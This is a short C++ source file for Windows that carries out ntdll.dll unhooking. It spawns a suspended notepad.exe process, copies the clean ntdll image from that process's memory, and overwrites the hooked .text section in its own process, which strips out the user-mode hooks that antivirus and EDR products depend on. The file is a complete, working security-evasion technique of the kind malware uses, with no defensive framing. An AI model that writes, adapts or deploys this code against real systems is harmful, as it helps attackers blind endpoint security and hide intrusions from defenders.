#include <windows.h>
#include <psapi.h>
#include <iostream>

int main() {
	LPVOID pNtdll = nullptr;
	MODULEINFO info;
	LPVOID lpBaseAddress = NULL;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(STARTUPINFOW));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	// Get baseAddress of hooked ntdll.dll
	GetModuleInformation(GetCurrentProcess(),
		GetModuleHandleW(L"ntdll.dll"),
		&info, sizeof(MODULEINFO));

	lpBaseAddress = info.lpBaseOfDll;
	std::cout << std::hex << lpBaseAddress;

	// Parse PE header of hooked ntdll.dll
	PIMAGE_DOS_HEADER hooked_dos = (PIMAGE_DOS_HEADER)lpBaseAddress;
	PIMAGE_NT_HEADERS hooked_nt =
		(PIMAGE_NT_HEADERS)((ULONG_PTR)lpBaseAddress + hooked_dos->e_lfanew);
	
	// Create suspended process
	CreateProcessW(L"C:\\Windows\\System32\\notepad.exe",
		NULL, NULL, NULL, TRUE, CREATE_SUSPENDED,
		NULL, NULL, &si, &pi);
	
	pNtdll = HeapAlloc(GetProcessHeap(), 0, info.SizeOfImage);
	ReadProcessMemory(pi.hProcess, (LPCVOID)lpBaseAddress,
		pNtdll, info.SizeOfImage, nullptr);
	
	// Parse PE header of fresh ntdll.dll from suspended process
	PIMAGE_DOS_HEADER fresh_dos = (PIMAGE_DOS_HEADER)pNtdll;
	PIMAGE_NT_HEADERS fresh_nt = (PIMAGE_NT_HEADERS)((ULONG_PTR)pNtdll + fresh_dos->e_lfanew);
	
	for (WORD i = 0; i < hooked_nt->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hooked_section =
			(PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(hooked_nt) +
				((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
		
		if (!strcmp((PCHAR)hooked_section->Name, ".text")) {
			DWORD oldProtect = 0;
			LPVOID hooked_text_section = (LPVOID)((ULONG_PTR)lpBaseAddress +
				(DWORD_PTR)hooked_section->VirtualAddress);
			
			LPVOID fresh_text_section = (LPVOID)((ULONG_PTR)pNtdll +
				(DWORD_PTR)hooked_section->VirtualAddress);
			
			VirtualProtect(hooked_text_section,
				hooked_section->Misc.VirtualSize,
				PAGE_EXECUTE_READWRITE,
				&oldProtect);
			
			RtlCopyMemory(
				hooked_text_section,
				fresh_text_section,
				hooked_section->Misc.VirtualSize);
			
			VirtualProtect(hooked_text_section,
				hooked_section->Misc.VirtualSize,
				oldProtect,
				&oldProtect);
		}
	}
	TerminateProcess(pi.hProcess, 0);

	return 0;
}